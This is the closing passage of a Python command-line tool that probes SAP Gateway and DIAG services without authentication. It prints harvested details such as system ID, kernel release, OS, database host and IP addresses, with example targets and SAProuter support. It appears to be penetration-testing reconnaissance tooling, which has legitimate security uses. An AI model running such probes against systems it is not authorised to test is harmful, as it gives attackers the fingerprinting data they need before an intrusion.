        _enrich_kernel_release(result, kr)

    return result


# ============================================================================
# Output Formatting
# ============================================================================

def print_results(info):
    """Pretty-print extracted system information."""
    status = info.get('status', 'unknown')
    methods_tried = info.get('methods_tried', [])
    methods_ok = info.get('methods_success', [])

    print()
    if status in ('timeout', 'refused', 'error'):
        print(f'[!] {info.get("error", status)}')
        return

    print('=' * 65)
    print('  SAP System Info - Unauthenticated Results')
    print('=' * 65)
    print(f'  Target:  {info.get("target")}:{info.get("port")}')
    print(f'  Status:  {status}')
    print(f'  Methods: tried={",".join(methods_tried) or "none"} '
          f'success={",".join(methods_ok) or "none"}')
    print()

    if status == 'rfc_success':
        print('  --- Full RFCSI_EXPORT Structure ---')
        print()
        for gname, fields in [
            ('System Identity', [
                ('System ID (SID)',  'RFCSYSID'),
                ('Destination',      'RFCDEST'),
                ('Hostname (short)', 'RFCHOST'),
                ('Hostname (full)',  'RFCHOST2'),
                ('Database Name',    'RFCDATABS'),
            ]),
            ('Software', [
                ('SAP Release',      'RFCSAPRL'),
                ('Kernel Release',   'RFCKERNRL'),
                ('Approx. Version',  'sap_release_approx'),
                ('Patch Level',      'RFCMACH'),
                ('RFC Protocol',     'RFCPROTO'),
            ]),
            ('Platform', [
                ('Operating System',  'RFCOPSYS'),
                ('Database System',   'RFCDBSYS'),
                ('Database Host',     'RFCDBHOST'),
                ('Integer Type',      'RFCINTTYP'),
                ('Float Type',        'RFCFLOTYP'),
                ('Codepage',          'RFCCHARTYP'),
            ]),
            ('Network', [
                ('IP Address',        'RFCIPADDR'),
                ('IPv6 Address',      'RFCIPV6ADDR'),
                ('Timezone (sec)',    'RFCTZONE'),
                ('Date Format',       'RFCDATEFM'),
            ]),
        ]:
            if any(info.get(k) for _, k in fields):
                print(f'  {gname}:')
                for label, key in fields:
                    v = info.get(key)
                    if v is not None and v != '':
                        print(f'    {label:22s} = {v}')
                print()

    elif status == 'diag_success':
        print('  --- DIAG Login Screen Information ---')
        print()
        for gname, fields in [
            ('System Identity', [
                ('System ID (SID)',  'RFCSYSID'),
                ('Hostname',         'hostname'),
                ('Client',           'diag_client'),
            ]),
            ('Software', [
                ('Kernel Version',   'diag_kernel_version'),
                ('Kernel Release',   'kernel_release'),
                ('SAP Release',      'sap_release_approx'),
                ('SAP Product',      'sap_product'),
            ]),
            ('DIAG Details', [
                ('Instance',         'instance_number'),
                ('Work Process',     'diag_work_process'),
                ('Codepage',         'diag_codepage'),
                ('Dynpro Name',      'diag_dynpro_name'),
                ('Dynpro Number',    'diag_dynpro_number'),
                ('Session Title',    'diag_session_title'),
                ('Error Text',       'diag_error_text'),
            ]),
        ]:
            section_fields = [(l, k) for l, k in fields
                              if info.get(k) is not None and info.get(k) != '']
            if section_fields:
                print(f'  {gname}:')
                for label, key in section_fields:
                    print(f'    {label:22s} = {info[key]}')
                print()

        # Print DIAG messages if any
        msgs = info.get('diag_messages', [])
        if msgs:
            print('  Messages:')
            for msg in msgs:
                print(f'    {msg}')
            print()

    elif status in ('info_extracted', 'partial_info', 'gateway_alive'):
        print('  --- Extracted Information ---')
        print()
        for gname, fields in [
            ('System Identity', [
                ('Hostname',         'hostname'),
                ('SAP SID',          'sap_sid'),
                ('Instance Profile', 'instance_profile'),
                ('Gateway',          'gateway_name'),
                ('Instance',         'instance_number'),
            ]),
            ('Software', [
                ('Kernel Release',   'kernel_release'),
                ('SAP Release',      'sap_release_approx'),
                ('SAP Product',      'sap_product'),
            ]),
            ('Platform', [
                ('OS (detected)',    'os_hint'),
            ]),
            ('Details', [
                ('Source Path',      'source_path'),
                ('SAP FS Path',      'sap_filesystem_path'),
                ('Error Message',    'error_message'),
                ('GW Function',      'gw_function'),
                ('Server Timestamp', 'server_timestamp'),
                ('Component',        'component'),
                ('Gateway Service',  'gw_service'),
                ('Codepage',         'gw_codepage'),
            ]),
        ]:
            section_fields = [(l, k) for l, k in fields
                              if info.get(k) is not None and info.get(k) != '']
            if section_fields:
                print(f'  {gname}:')
                for label, key in section_fields:
                    print(f'    {label:22s} = {info[key]}')
                print()

    print('=' * 65)

    # One-line summary
    sid = info.get('RFCSYSID') or info.get('sap_sid') or info.get('hostname', '?')
    kern = info.get('RFCKERNRL') or info.get('kernel_release', '?')
    osys = info.get('RFCOPSYS') or info.get('os_hint', '?')
    rel = info.get('RFCSAPRL') or info.get('sap_release_approx', '')
    parts = [f'SID={sid}', f'Kernel={kern}']
    if rel:
        parts.append(f'Release={rel}')
    parts.append(f'OS={osys}')
    host = info.get('hostname', '')
    db = info.get('RFCDBSYS', '')
    ip = info.get('RFCIPADDR', '')
    product = info.get('sap_product', '')
    if host and host != sid:
        parts.append(f'Host={host}')
    if db:
        parts.append(f'DB={db}')
    if ip:
        parts.append(f'IP={ip}')
    if product:
        parts.append(f'({product})')
    print(f'\n  Summary: {" ".join(parts)}\n')


# ============================================================================
# CLI Entry Point
# ============================================================================

def main():
    parser = argparse.ArgumentParser(
        description='SAP RFC_SYSTEM_INFO - Unauthenticated System Info',
        epilog=(
            'Examples:\n'
            '  %(prog)s -t 192.168.2.209 -p 3300 -v\n'
            '  %(prog)s -t 192.168.2.29 -p 3340 --json\n'
            '  %(prog)s -t 192.168.2.29:3340 -t 192.168.2.209:3300\n'
        ),
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    parser.add_argument('-t', '--target', action='append', required=True,
                        help='Target IP or IP:port (can specify multiple)')
    parser.add_argument('-p', '--port', type=int, default=3300,
                        help='Default SAP Gateway port (default: 3300)')
    parser.add_argument('-T', '--timeout', type=int, default=10,
                        help='Timeout in seconds (default: 10)')
    parser.add_argument('-R', '--router',
                        help='SAProuter host[:port] (default port 3299)')
    parser.add_argument('-v', '--verbose', action='store_true',
                        help='Verbose protocol-level output')
    parser.add_argument('--json', action='store_true', help='JSON output')
    args = parser.parse_args()

    # Parse targets: support both "-t ip -p port" and "-t ip:port"
    targets = []
    for t in args.target:
        if ':' in t:
            host, p = t.rsplit(':', 1)
            targets.append((host, int(p)))
        else:
            targets.append((t, args.port))

    # Parse SAProuter
    router = None
    if args.router:
        if ':' in args.router:
            rhost, rport = args.router.rsplit(':', 1)
            router = (rhost, int(rport))
        else:
            router = (args.router, 3299)

    all_results = []
    for host, port in targets:
        if not args.json:
            print(f'[*] SAP System Info - Unauthenticated Probe')
            print(f'[*] Target: {host}:{port}')
            if router:
                print(f'[*] Via SAProuter: {router[0]}:{router[1]}')

        result = probe_sap_system(host, port, args.timeout, args.verbose,
                                  router)
        all_results.append(result)

        if args.json:
            pass  # print all at end
        else:
            print_results(result)

    if args.json:
        output = all_results if len(all_results) > 1 else all_results[0]
        # Clean internal fields
        def clean(d):
            return {k: v for k, v in d.items() if not k.startswith('_')}
        if isinstance(output, list):
            output = [clean(r) for r in output]
        else:
            output = clean(output)
        print(json_module.dumps(output, indent=2, default=str))


if __name__ == '__main__':
    main()
